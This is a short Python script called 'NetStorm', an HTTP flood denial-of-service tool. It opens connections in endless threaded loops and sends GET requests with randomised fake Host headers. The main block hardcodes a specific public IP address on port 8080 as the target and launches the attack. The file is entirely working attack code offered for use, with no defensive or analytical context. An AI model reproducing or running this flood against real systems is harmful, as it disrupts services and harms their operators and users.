
import socket
import threading
import random
import sys

class NetStorm:
    def __init__(self, \
                 target, \
                 port, \
                 n_thread=500
        ):

        self.target = target
        self.port = port
        self.n_thread = n_thread

    def attack(self):
        while True:
            print(f"[+] Attack started")
            server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server_socket.connect((self.target, self.port))

            server_socket.sendto(
                (f"GET /{self.target} HTTP/1.1\r\n").encode("ascii"),
                (self.target, self.port)
            )

            server_socket.sendto(
                (f"Host: {self.fake_ip()} \r\n\r\n").encode("ascii"),
                (self.target, self.port)
            )

    def thread(self):
        print(f"[+] Starting thread: {self.n_thread}")
        for i in range(self.n_thread):
            thread = threading.Thread(target=self.attack)
            thread.start()

    def fake_ip(self):
        generated = ".".join(str(random.randint(0, 255)) for _ in range(4))
        return generated

class cli:
    def __init__(self):
        self.args = sys.argv

    def display_help(self):
        self.help_msg = [
            f"Usage: netstorm [COMMAND] [OPTION]\n",
            f"Commands:",
            f"   {'attack':<15} attack a specific target",
            f"\nOptions:",
            f"   {'-t, --target':<15} set a target"
        ]
        for row in self.help_msg:
            print(row)

if __name__ == "__main__":
    host = "104.22.54.228"
    port = 8080
    netstorm = NetStorm(host, port)
    netstorm.attack()
